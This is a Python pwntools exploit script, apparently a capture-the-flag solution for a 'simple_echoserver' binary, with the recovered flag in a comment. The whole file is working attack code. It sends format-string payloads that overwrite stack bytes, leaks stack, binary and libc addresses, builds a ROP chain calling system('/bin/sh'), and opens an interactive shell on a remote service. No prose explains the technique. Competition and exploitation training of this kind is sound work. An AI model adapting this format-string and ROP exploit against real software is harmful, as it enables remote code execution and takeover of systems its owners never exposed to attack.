from pwn import *

# flag{do_you_like_my_simple_echoserver_f1b960576af79d28}

context.log_level='debug'
l1 = len('[USER] name: ')

# p = process('./simple_echoserver')
# pause()
# n = ''
# n += '%c%c%c%c'
# n += '%c%' + str(0xe0-(5+l1)) + 'c'
# n += '%hhn'
# n += '%c'*(10)
# n += '%' + str(0x138-(10+0xe0)) + 'c'       # XXX: stack off -- 1/16 chance
# n += '%hhn'
# n += '%c'* 18
# n += '%' + str(0x2ba-(0x138+18)) + 'c'  # change main thingy
# n += '%hhn'
# n += '%c%c'
# n += '%' + str(0x6f0-(0x2ba+2)) + 'c'       # XXX: fix this before running without aslr
# n += '%hn'
# n += '%c'*20
# n += '%' + str(0x801-(0x6f0+20)) + 'c'
# n += '%hhn'
# n += '\n'
# p.sendafter('name: ', n)
# c = ''
# c += '123456\n'
# p.sendafter('phone: ', c)
# p.sendline('~.\n')

# s0 = 0xe0
# s1 = 0x38

s0 = 0xd0
s1 = 0x28

# s0 = 0xc0
# s1 = 0x18

# s0 = 0x90
# s1 = 0xe8

# s0 = 0xa0
# s1 = 0xf8

s2 = 0xba

libc1 = 0x66f0

# 66f0
# a6f0
# c6f0
# e6f0

# p = remote('localhost',2323)
p = remote('pwnable.org',12020)
n = ''
n += '%c%c%c%c'
n += '%c%' + str(s0-(5+l1)) + 'c'
n += '%hhn'
n += '%c'*(10)
n += '%' + str((s1+0x100)-(10+s0)) + 'c'       # XXX: stack off -- 1/16 chance
n += '%hhn'
n += '%c'* 18
n += '%' + str((s2+0x200)-((s1+0x100)+18)) + 'c'  # change main thingy
n += '%hhn'
n += '%c%c'
n += '%' + str(libc1-((s2+0x200)+2)) + 'c'       # XXX: fix this before running without aslr
n += '%hn'
n += '%c'*20
n += '%' + str((libc1+0x111)-(libc1+20)) + 'c'
n += '%hhn'
n += '\n'
p.sendafter('name: ', n)
c = ''
c += '123456\n'
p.sendafter('phone: ', c)
p.send('~.\n')


n = ''
n += '%c%c%c%c'
n += '%c'*13
n += '%' + str(s1-(13+4+l1)) + 'c'       # XXX: stack off -- 1/16 chance
n += '%hhn'
n += '%c'*18
n += '%' + str(s2-(s1+18)) + 'c'  # change main thingy
n += '%hhn'
n += '%p-'*20
n += '\n'
p.sendafter('name: ', n)
p.sendafter('phone: ', '1234\n')

p.recvuntil('-')
sl = int(p.recvuntil('-')[:-1],16)
p.recvuntil('-')
p.recvuntil('-')
cb = int(p.recvuntil('-')[:-1],16) - 0x14ba
p.recvuntil('-')
p.recvuntil('-')
p.recvuntil('-')
lb = int(p.recvuntil('-')[:-1],16) - 0x21b97
log.info("%#x", sl)
log.info("%#x", cb)
log.info("%#x", lb)

pop_rdi_ret = cb + 0x1543
ret = pop_rdi_ret + 1
bsh = lb + 0x1b3e9a
sy  = lb + 0x4f440

p.sendline('asdfasdf')
p.sendline('~.')

n = ''
n += '%c%c%c%c'
n += '%c'*33
n += '%' + str(((sl - 0x208) & 0xffff) - (33 + l1 + 4)) + 'c'
n += '%hn'
n += '\n'
p.sendafter('name: ', n)
p.sendafter('phone: ', '1234\n')
z = ''
z += 'A'*0x8
z += p64(0)
z += p64(pop_rdi_ret)
z += p64(bsh)
z += p64(sy)
p.sendline(z)
p.sendline('~.')


p.interactive()
